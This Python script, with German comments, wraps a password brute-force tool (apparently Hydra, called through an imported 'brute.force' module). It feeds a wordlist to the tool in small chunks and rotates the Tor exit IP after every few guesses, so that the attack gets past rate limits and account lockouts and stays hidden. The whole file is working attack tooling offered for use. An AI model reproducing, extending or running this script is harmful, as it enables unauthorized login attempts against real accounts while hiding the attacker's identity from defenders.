import time
import json
from pathlib import Path
import requests
import shutil
import subprocess
from stem import Signal
from stem.control import Controller
from brute import force
import signal


TOR_PROXY = {
    "http": "socks5h://127.0.0.1:9050", # h = hostname resolution through proxy (DNS)
    "https": "socks5h://127.0.0.1:9050"
}

CONTROL_PORT = 9051

WORDLIST = Path("wordlist.txt")
STATE_FILE = Path("hydra_state.json")
CHUNK_FILE = Path(".hydra_chunk.txt")

CHUNK_SIZE = 5


def handler(signum, frame):
    print("Ctrl+C gedrückt, Programm wird beendet.")
    exit(0)

# Signal für den Druck von Ctrl+C umfassen
signal.signal(signal.SIGINT, handler)

def is_tor_running() -> bool:
    result = subprocess.run(
        ["pgrep", "-x", "tor"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return result.returncode == 0


def start_tor_if_needed() -> None:
    if is_tor_running():
        print("[+] Tor läuft bereits.")
        return

    print("[*] Tor läuft nicht. Starte Tor...")

    if shutil.which("brew"):
        subprocess.run(
            ["brew", "services", "start", "tor"],
            check=True,
        )
    elif shutil.which("tor"):
        subprocess.Popen(
            ["tor"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    else:
        raise RuntimeError("Tor ist nicht installiert.")

    time.sleep(5)
    print("[+] Tor wurde gestartet.")


def get_current_ip() -> str:
    """
    Fragt die aktuelle öffentliche IP über Tor ab.
    socks5h sorgt dafür, dass auch DNS über Tor läuft.
    """
    response = requests.get(
        "https://api.ipify.org",
        proxies=TOR_PROXY,
        timeout=10,
    )
    response.raise_for_status()
    return response.text.strip()


def rotate_tor_ip() -> None:
    """
    Fordert von Tor eine neue Identität an.
    Das ist besser als Tor ständig neu zu starten.
    """
    with Controller.from_port(port=CONTROL_PORT) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)


def load_index():
    if not STATE_FILE.exists():
        return 0

    data = json.loads(STATE_FILE.read_text())
    return data.get("index", 0)


def save_index(index):
    STATE_FILE.write_text(json.dumps({"index": index}, indent=2))


def read_chunk(start, size):
    words = WORDLIST.read_text().splitlines()
    return words[start:start + size]


def write_chunk(words):
    CHUNK_FILE.write_text("\n".join(words) + "\n")


def run_actions_with_rotation(actions_per_ip: int = 5) -> None:
    try:
        index = load_index()
    except Exception as e:
        print("ERROR:", e)

    while True:

        try:
            ip = get_current_ip()
            print(f"[+] Current Tor IP: {ip}")
        except Exception as e:
            print("[-] ERROR while grabbing current ip:", e)

        try:
            chunk = read_chunk(index, actions_per_ip)
        except Exception as e:
            print("[-] ERROR while reading chunk:", e)

        if not chunk:
            print("[+] Fertig.")
            break

        try:

            write_chunk(chunk)
            print(f"[*] Teste {len(chunk)} Einträge ab Index {index}...")

        except Exception as e:
            print("[-] ERROR while writing chunk:", e)

        try:
            force.fire()
        except Exception as error:
            print("[!] HYDRA-ERROR:", error)

        try:
            index += len(chunk)
            save_index(index)
        except Exception as e:
            print("[-] ERROR while saving index:", e)

        print("[*] Rotating Tor IP...")
        try:
            rotate_tor_ip()
        except Exception as e:
            print("[-] ERROR while rotate tor ip:", e)
        time.sleep(10) #importent so TOR can reboot (change ip)


if __name__ == "__main__":
    start_tor_if_needed()
    run_actions_with_rotation(actions_per_ip=6)


